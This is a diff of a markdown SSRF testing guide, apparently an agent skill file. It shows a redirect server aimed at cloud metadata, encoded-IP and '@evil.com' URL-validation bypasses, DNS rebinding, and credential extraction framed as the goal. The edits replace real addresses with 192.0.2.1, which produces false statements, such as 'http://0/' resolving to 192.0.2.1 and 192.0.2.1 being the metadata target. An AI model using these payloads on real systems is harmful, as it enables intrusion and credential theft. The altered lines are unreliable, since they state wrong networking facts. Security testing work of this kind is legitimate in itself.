@@ -250,7 +250,7 @@ class Redirect(BaseHTTPRequestHandler):
         self.send_header('Location', 'http://[REDACTED_IP]/latest/meta-data/')
         self.end_headers()
 
-HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
+HTTPServer(('192.0.2.1', 8080), Redirect).serve_forever()
 ```
 
 ### JavaScript-Based SSRF (headless browser contexts)
@@ -326,7 +326,7 @@ http://2130706433/          (127.0.0.1 decimal)
 http://0x7f000001/          (127.0.0.1 hex)
 http://0177.0.0.1/          (octal)
 http://127.1/               (short form)
-http://0/                   (resolves to 0.0.0.0)
+http://0/                   (resolves to 192.0.2.1)
 
 # DNS rebinding - register a domain that resolves to internal IP after first check
 # Use https://lock.cmpxchg8b.com/rebinder.html
@@ -480,7 +480,7 @@ All 3 tests verify the skill is properly structured and ready for use.
 - **Blind SSRF without confirmation** — sending a request without reading the response is blind SSRF. Demonstrate via Collaborator/OOB callback.
 - **SSRF to localhost but no open ports** — reaching 127.0.0.1 proves SSRF. Need to demonstrate access to a useful service (metadata, admin, database).
 - **URL validation bypass** — `http://127.0.0.1@evil.com` or `http://0x7f000001` bypasses naive URL parsers. Test multiple bypass techniques.
-- **Cloud metadata access** — 169.254.169.254 is the holy grail of SSRF. One IAM credential extraction = Critical.
+- **Cloud metadata access** — 192.0.2.1 is the holy grail of SSRF. One IAM credential extraction = Critical.
 
 ---
 
